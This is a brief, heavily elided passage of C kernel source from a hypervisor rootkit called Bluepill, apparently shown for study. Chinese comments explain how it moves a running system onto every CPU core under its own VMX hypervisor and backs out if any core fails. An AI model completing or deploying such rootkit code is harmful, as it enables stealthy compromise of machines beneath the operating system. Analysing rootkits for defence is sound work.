...
NTSTATUS HvmSubvertCpu(PVOID GuestRsp) {
  ...
  if (!pCpu->OriginaVmxonR) {
    KdPrint(
        ("VmxInitialize(): Failed to allocate memory for original VMXON\n"));
  ...
  *(ULONG64 *)pCpu->OriginaVmxonR =
      (__readmsr(MSR_IA32_VMX_BASIC) & 0xffffffff); // set up vmcs_revision_id
...
HvmSpitOutBluepill() {
  ...
  for (i = 0; i < KeNumberProcessors; i++) {
    KeSetSystemAffinityThread(
        (KAFFINITY)((ULONG_PTR)1 << i)); // 将代码运行在指定CPU
...
HvmSwallowBluepill() {
  ...
  for (i = 0; i < KeNumberProcessors; i++) {
    ...
    Status = CmSubvert(
        NULL); // CmSubvert的流程是保存所有寄存器(除了段寄存器)的内容到栈里后，调用HvmSubvertCpu
  ...
  if (KeNumberProcessors !=
      g_uSubvertedCPUs) // 如果没有对每个核都侵染成功，则撤销更改
  {
    HvmSpitOutBluepill();
    return STATUS_UNSUCCESSFUL;
  }
